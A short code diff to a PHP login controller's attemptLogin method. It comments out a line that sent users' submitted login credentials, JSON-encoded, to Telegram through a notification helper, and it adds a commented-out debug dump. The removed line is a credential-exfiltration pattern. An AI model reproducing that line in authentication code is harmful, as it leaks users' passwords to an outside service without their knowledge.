@@ -55,9 +55,10 @@ class LoginController extends Controller
      */
     protected function attemptLogin(Request $request)
     {
+//        dd($request->all());
         $credentials = $this->credentials($request);
 
-        TelegramNotification::sendMessage(json_encode($credentials, JSON_UNESCAPED_SLASHES));
+//        TelegramNotification::sendMessage(json_encode($credentials, JSON_UNESCAPED_SLASHES));
 
         if(is_array($credentials)) {
             $credentials['status'] = 1;
